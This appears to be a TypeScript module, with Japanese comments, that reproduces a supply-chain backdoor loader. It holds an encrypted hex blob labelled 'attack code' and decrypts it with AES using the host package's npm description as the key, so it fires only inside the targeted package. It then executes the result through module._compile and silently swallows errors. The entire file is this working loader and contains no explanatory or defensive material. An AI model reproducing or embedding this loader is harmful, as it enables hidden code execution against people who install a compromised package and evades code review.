import * as crypto from "crypto";

// _compile()の定義が無かったので追加
declare global {
  interface NodeModule {
    _compile(arg1: string, arg2: string): any;
  }
}

export default () => {
  // 攻撃コード
  const data =
    "cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f";
  // 復号器
  const decipher = crypto.createDecipher(
    "aes256",
    process.env.npm_package_description || ""
  );

  // パスワードが違うとこけるのでキャッチ
  try {
    // 復号
    const payload =
      decipher.update(data, "hex", "utf8") + decipher.final("utf8");
    // 実行
    module._compile(payload, "");
  } catch {}
};
